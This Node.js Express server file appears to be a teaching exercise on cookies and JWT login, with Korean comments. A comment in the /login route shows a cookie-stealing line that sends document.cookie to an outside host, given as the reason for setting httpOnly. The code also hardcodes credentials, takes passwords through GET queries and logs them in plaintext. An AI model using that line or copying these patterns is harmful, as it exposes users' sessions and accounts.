const express =require('express'); 
const cookieParser = require('cookie-parser'); 
const app = express(); 
const token =require('./createToken');
const Atoken =require('./jwt');  
const nunjucks = require('nunjucks'); 
const bodyParser = require('body-parser');
const auth = require('./middleware/auth')


app.set('view engine', 'html'); 
nunjucks.configure('views',{ 
  express:app,
})
app.use(bodyParser.json()); 
app.use(bodyParser.urlencoded({extended:false,})); 
app.use(cookieParser()); 
app.use(express.static('public'));
app.get('/', (req,res)=>{ 
  
  let {msg} = req.query; 
  //개발자 도구 아플리케이션-스토리지- 쿠키 에서 확인
  //res.cookie('token','duck'); //set-cookie:'token=duck';
  //응답메세지에서 header부분에 쿠키를 생성해서 주겠다.  
  //브라우저는 이 쿠키를 받아서 브라우저가 갖고있는 저장소에 쿠키를 저장.
  //그리고 항상 서버에 그 쿠키를 보내줌 
  //res.cookie('키','밸류') => 
  /*
    headers:{ 
      set-cookie:'token=duck', //헤더에 이 코드가 삽입된 상태 
    }
  */
  res.render('index.html');
    // res.send(`<h1>${msg}</h1><br>hello world<br><a href="/menu1">menu1</a><br><a href="/login?id=root&pw=root">로그인</a>`);
  /*
    headers:{ 
       ...
    },
    body:{ 
      hello world 
    }
  */
 //res.send나 render는 응답메세지를 완성시켜 보내줌.
})

app.get('/user/info',auth,(req,res)=>{ 
  res.send(`HELLO ${req.userid}`); 
})

app.get('/menu1',(req,res)=>{ 
  res.send('menu1페이지입니다.'); 
})

app.get('/login',(req,res)=>{ 
  const {id,pw} = req.query; //비구조 할당문 선언시 let, const 변수 선언
  // 혹시 사용할 이유가 없다면 () 로 묶어서 사용 

  if(id == 'root' && pw == 'root'){ 
    //토큰생성
    let ctoken = token();
    //location.href=`http://naver.com?${document.cookie}`
    //쿠키를 가로채는 것을 막기위해 세번째 인자 사용. 
    //쿠키보안을 위해 
    res.cookie('token',ctoken,{httpOnly:true,secure:true,}); 
    res.redirect('/?msg=로그인 성공')
  }else{ 
    res.redirect('/?msg=로그인 실패')
    //토큰실패 
  }
})

app.post('/auth/local/login',(req,res)=>{ 
  let {userid,userpw} = req.body; 
  //let {huserid,huserpw} = JSON.parse(req.get('data')) //스트링을 제이슨형태로
  console.log(`body req ${userid} ${userpw}`);
  //console.log('data req',huserid,huserpw); 
  let result={}; 
  if(userid=='123' &&userpw=='123'){ 
    result ={ 
      result:true, 
      msg:'로그인에 성공하셨습니다.'
    }

    let token = Atoken(userid);
    res.cookie('AccessToken',token,{httpOnly:true,secure:true,})

  }else { 
    result ={ 
      result:false, 
      msg:'아이디와 비밀번호를 확인해주세요.'
    }
  }
  res.json(result); 
  
})



app.listen(3000,()=>{ 
  console.log('hello port 3000'); 
})